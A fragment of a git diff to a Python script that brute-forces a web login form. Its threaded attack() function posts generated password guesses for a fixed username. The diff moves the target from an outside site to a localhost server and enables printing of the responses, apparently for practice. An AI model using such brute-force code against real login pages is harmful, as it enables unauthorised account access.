@@ -2,15 +2,15 @@ import itertools
 import requests
 import threading
 def attack(password):
-    username = "wahaj"
+    username = "sherill"
     session = requests.Session()
-    login_page = session.get("http://www.honeypots.studio")
+    login_page = session.get("http://127.0.0.1:5000")
     login_data = {
         "username": username,
         "password": password,
     }
-    login_response = session.post("http://www.honeypots.studio", data=login_data)
-    # print(login_response.text)
+    login_response = session.post("http://127.0.0.1:5000", data=login_data)
+    print(login_response.text)
 
 def generate_combinations(start_index, end_index):
     # Generate the combinations for the given range
